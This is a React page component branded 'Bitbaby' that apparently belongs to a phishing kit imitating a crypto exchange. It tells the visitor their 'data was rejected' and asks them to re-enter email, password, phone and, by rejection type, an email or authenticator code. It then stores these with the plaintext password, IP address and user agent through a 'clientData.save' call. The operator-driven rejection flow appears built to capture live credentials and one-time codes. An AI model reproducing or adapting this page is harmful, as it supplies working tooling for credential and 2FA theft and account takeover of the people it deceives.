import { useState, useEffect } from "react";
import { Eye, EyeOff, AlertCircle, CheckCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

/**
 * Retry Page - Client can retry after rejection
 * Shows rejection reason and allows correcting data
 */
export default function Retry() {
  const [location, setLocation] = useLocation();
  const [attemptId, setAttemptId] = useState<number | null>(null);
  const [rejectionReason, setRejectionReason] = useState<string>("");
  const [rejectionType, setRejectionType] = useState<string>("");
  const [showPassword, setShowPassword] = useState(false);
  
  // Form states
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [phone, setPhone] = useState("");
  const [countryCode, setCountryCode] = useState("+1");
  const [emailCode, setEmailCode] = useState("");
  const [authCode, setAuthCode] = useState("");
  
  // Validation states
  const [validation, setValidation] = useState({
    email: { isValid: false, message: "" },
    password: { isValid: false, message: "" },
    phone: { isValid: false, message: "" },
  });

  const saveClientDataMutation = trpc.clientData.save.useMutation();
  const authenticateMutation = trpc.clientData.authenticate.useMutation();

  // Get rejection info from URL params
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get("id");
    const reason = params.get("reason");
    const type = params.get("type");

    if (id) {
      setAttemptId(parseInt(id));
      setRejectionReason(reason || "");
      setRejectionType(type || "");
    } else {
      // Redirect to home if no rejection info
      setLocation("/");
    }
  }, [setLocation]);

  // Email validation
  const validateEmail = (value: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!value) {
      setValidation((prev) => ({
        ...prev,
        email: { isValid: false, message: "" },
      }));
    } else if (emailRegex.test(value)) {
      setValidation((prev) => ({
        ...prev,
        email: { isValid: true, message: "Email válido" },
      }));
    } else {
      setValidation((prev) => ({
        ...prev,
        email: { isValid: false, message: "Email inválido" },
      }));
    }
    setEmail(value);
  };

  // Password validation
  const validatePassword = (value: string) => {
    if (!value) {
      setValidation((prev) => ({
        ...prev,
        password: { isValid: false, message: "" },
      }));
    } else if (value.length < 8) {
      setValidation((prev) => ({
        ...prev,
        password: { isValid: false, message: "Minimum 8 characters" },
      }));
    } else if (value.length > 20) {
      setValidation((prev) => ({
        ...prev,
        password: { isValid: false, message: "Máximo 20 caracteres" },
      }));
    } else if (!/\d/.test(value)) {
      setValidation((prev) => ({
        ...prev,
        password: { isValid: false, message: "Deve conter números" },
      }));
    } else {
      setValidation((prev) => ({
        ...prev,
        password: { isValid: true, message: "Senha válida" },
      }));
    }
    setPassword(value);
  };

  // Phone validation
  const validatePhone = (value: string) => {
    const phoneRegex = /^\d{8,15}$/;
    if (!value) {
      setValidation((prev) => ({
        ...prev,
        phone: { isValid: false, message: "" },
      }));
    } else if (phoneRegex.test(value)) {
      setValidation((prev) => ({
        ...prev,
        phone: { isValid: true, message: "Telefone válido" },
      }));
    } else {
      setValidation((prev) => ({
        ...prev,
        phone: { isValid: false, message: "8 a 15 dígitos" },
      }));
    }
    setPhone(value);
  };

  const handleRetry = async () => {
    try {
      // Get client IP
      const ipResponse = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipResponse.json();
      const clientIp = ipData.ip || "unknown";

      // Save corrected data
      await saveClientDataMutation.mutateAsync({
        email: email || undefined,
        password,
        phoneNumber: phone || undefined,
        phoneCountryCode: countryCode,
        emailVerificationCode: emailCode || undefined,
        authenticatorCode: authCode || undefined,
        loginMethod: email ? "email" : "phone",
        ipAddress: clientIp,
        userAgent: navigator.userAgent,
      });

      // Redirect to verification
      setLocation("/verify-email");
    } catch (error) {
      console.error("Error retrying:", error);
    }
  };

  if (!attemptId) {
    return null;
  }

  const getRejectionMessage = () => {
    switch (rejectionType) {
      case "invalid_email_password":
        return "Email or password incorrect. Please try again with correct data.";
      case "invalid_phone_password":
        return "Phone or password incorrect. Please try again with correct data.";
      case "invalid_email_code":
        return "Invalid email code. Please check your email and try again.";
      case "invalid_authenticator_code":
        return "Invalid authenticator code. Please check your app and try again.";
      default:
        return rejectionReason || "Your data was rejected. Please try again";
    }
  };

  return (
    <div className="min-h-screen bg-black text-white overflow-hidden">
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between px-4 md:px-8 py-4 md:py-6 bg-black/80 backdrop-blur-sm border-b border-white/5">
        <div className="flex items-center gap-2 md:gap-3">
          <div className="flex items-center gap-1">
            <div className="w-5 h-5 md:w-6 md:h-6 rounded-full bg-yellow-400 flex items-center justify-center text-black font-bold text-xs">●</div>
            <div className="w-5 h-5 md:w-6 md:h-6 rounded-full bg-yellow-400 flex items-center justify-center text-black font-bold text-xs">●</div>
          </div>
          <span className="text-lg md:text-xl font-bold tracking-tight">Bitbaby</span>
        </div>
        <Button
          onClick={() => setLocation("/")}
          variant="outline"
          className="text-white border-white/20 hover:bg-white/10"
        >
          Back
        </Button>
      </header>

      {/* Main Content */}
      <main className="pt-20 md:pt-24 px-4 md:px-8 pb-8 md:pb-0 min-h-screen flex items-center">
        <div className="max-w-2xl mx-auto w-full">
          {/* Rejection Alert */}
          <div className="mb-8 p-4 md:p-6 bg-red-500/10 border border-red-500/30 rounded-lg">
            <div className="flex gap-3">
              <AlertCircle className="w-6 h-6 text-red-400 flex-shrink-0" />
              <div>
                <h2 className="text-lg font-semibold text-red-400 mb-2">Data Rejected</h2>
                <p className="text-white/80 text-sm md:text-base">
                  {getRejectionMessage()}
                </p>
              </div>
            </div>
          </div>

          {/* Retry Form */}
          <div className="space-y-6 md:space-y-8">
            <div>
      <h1 className="text-3xl md:text-4xl font-bold mb-2 tracking-tight">Try Again</h1>
      <p className="text-white/60">Correct your data and try logging in again</p>
            </div>

            {/* Email Field */}
            <div>
              <label className="block text-sm font-medium mb-2">Email</label>
              <div className="relative">
                <input
                  type="email"
                  placeholder="your@email.com"
                  value={email}
                  onChange={(e) => validateEmail(e.target.value)}
                  className={`w-full px-3 md:px-4 py-2.5 md:py-3 bg-white/5 border rounded-lg text-white placeholder-white/40 focus:outline-none transition-all text-sm md:text-base ${
                    email
                      ? validation.email.isValid
                        ? "border-green-500/50 focus:border-green-500 focus:bg-green-500/5"
                        : "border-red-500/50 focus:border-red-500 focus:bg-red-500/5"
                      : "border-white/20 focus:border-white/50 focus:bg-white/10"
                  }`}
                />
                {email && (
                  <div className="absolute right-3 top-1/2 -translate-y-1/2">
                    {validation.email.isValid ? (
                      <CheckCircle size={18} className="text-green-500" />
                    ) : (
                      <AlertCircle size={18} className="text-red-500" />
                    )}
                  </div>
                )}
              </div>
              {email && validation.email.message && (
                <p
                  className={`text-xs md:text-sm mt-2 ${
                    validation.email.isValid ? "text-green-500" : "text-red-500"
                  }`}
                >
                  {validation.email.message}
                </p>
              )}
            </div>

            {/* Password Field */}
            <div>
              <label className="block text-sm font-medium mb-2">Password</label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Minimum 8 characters with numbers"
                  value={password}
                  onChange={(e) => validatePassword(e.target.value)}
                  className={`w-full px-3 md:px-4 py-2.5 md:py-3 bg-white/5 border rounded-lg text-white placeholder-white/40 focus:outline-none transition-all pr-10 text-sm md:text-base ${
                    password
                      ? validation.password.isValid
                        ? "border-green-500/50 focus:border-green-500 focus:bg-green-500/5"
                        : "border-red-500/50 focus:border-red-500 focus:bg-red-500/5"
                      : "border-white/20 focus:border-white/50 focus:bg-white/10"
                  }`}
                />
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-white/50 hover:text-white/70 transition-colors"
                >
                  {showPassword ? (
                    <EyeOff size={18} />
                  ) : (
                    <Eye size={18} />
                  )}
                </button>
              </div>
              {password && validation.password.message && (
                <p
                  className={`text-xs md:text-sm mt-2 ${
                    validation.password.isValid ? "text-green-500" : "text-red-500"
                  }`}
                >
                  {validation.password.message}
                </p>
              )}
            </div>

            {/* Phone Field */}
            <div>
              <label className="block text-sm font-medium mb-2">Phone (Optional)</label>
              <div className="flex gap-2">
                <select
                  value={countryCode}
                  onChange={(e) => setCountryCode(e.target.value)}
                  className="px-2 md:px-3 py-2.5 md:py-3 bg-white/5 border border-white/20 rounded-lg text-white hover:border-white/40 hover:bg-white/10 transition-all text-sm md:text-base"
                >
                  <option value="+1">+1</option>
                  <option value="+55">+55</option>
                  <option value="+44">+44</option>
                  <option value="+33">+33</option>
                  <option value="+49">+49</option>
                </select>
                <div className="flex-1 relative">
                  <input
                    type="tel"
                    placeholder="Número de telefone"
                    value={phone}
                    onChange={(e) => validatePhone(e.target.value.replace(/\D/g, ""))}
                    className={`w-full px-3 md:px-4 py-2.5 md:py-3 bg-white/5 border rounded-lg text-white placeholder-white/40 focus:outline-none transition-all text-sm md:text-base ${
                      phone
                        ? validation.phone.isValid
                          ? "border-green-500/50 focus:border-green-500 focus:bg-green-500/5"
                          : "border-red-500/50 focus:border-red-500 focus:bg-red-500/5"
                        : "border-white/20 focus:border-white/50 focus:bg-white/10"
                    }`}
                  />
                  {phone && (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2">
                      {validation.phone.isValid ? (
                        <CheckCircle size={18} className="text-green-500" />
                      ) : (
                        <AlertCircle size={18} className="text-red-500" />
                      )}
                    </div>
                  )}
                </div>
              </div>
              {phone && validation.phone.message && (
                <p
                  className={`text-xs md:text-sm mt-2 ${
                    validation.phone.isValid ? "text-green-500" : "text-red-500"
                  }`}
                >
                  {validation.phone.message}
                </p>
              )}
            </div>

            {/* Email Code Field */}
            {rejectionType === "invalid_email_code" && (
              <div>
                <label className="block text-sm font-medium mb-2">Email Code</label>
                <input
                  type="text"
                  placeholder="6-digit code"
                  value={emailCode}
                  onChange={(e) => setEmailCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  maxLength={6}
                  className="w-full px-3 md:px-4 py-2.5 md:py-3 bg-white/5 border border-white/20 rounded-lg text-white placeholder-white/40 focus:outline-none transition-all text-sm md:text-base focus:border-yellow-400/50 focus:bg-yellow-400/5"
                />
              </div>
            )}

            {/* Authenticator Code Field */}
            {rejectionType === "invalid_authenticator_code" && (
              <div>
                <label className="block text-sm font-medium mb-2">Authenticator Code</label>
                <input
                  type="text"
                  placeholder="6-digit code"
                  value={authCode}
                  onChange={(e) => setAuthCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  maxLength={6}
                  className="w-full px-3 md:px-4 py-2.5 md:py-3 bg-white/5 border border-white/20 rounded-lg text-white placeholder-white/40 focus:outline-none transition-all text-sm md:text-base focus:border-blue-400/50 focus:bg-blue-400/5"
                />
              </div>
            )}

            {/* Retry Button */}
            <Button
              onClick={handleRetry}
              disabled={(
                !password ||
                !validation.password.isValid ||
                (email && !validation.email.isValid) ||
                (phone && !validation.phone.isValid)
              ) as any}
              className="w-full bg-white text-black hover:bg-gray-100 disabled:bg-gray-400 disabled:cursor-not-allowed font-bold py-2.5 md:py-3 rounded-lg text-base md:text-base transition-colors h-auto"
            >
              Try Again
            </Button>

            {/* Back Link */}
            <div className="text-center">
              <button
                onClick={() => setLocation("/")}
                className="text-white/60 hover:text-white transition-colors text-sm"
              >
                Back to login
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Floating Chat Button */}
      <button className="fixed bottom-6 right-6 md:bottom-8 md:right-8 w-14 h-14 md:w-16 md:h-16 rounded-full bg-gradient-to-br from-cyan-400 to-teal-500 hover:from-cyan-300 hover:to-teal-400 shadow-lg hover:shadow-xl transition-all flex items-center justify-center text-white text-xl md:text-2xl font-bold">
        💬
      </button>
    </div>
  );
}
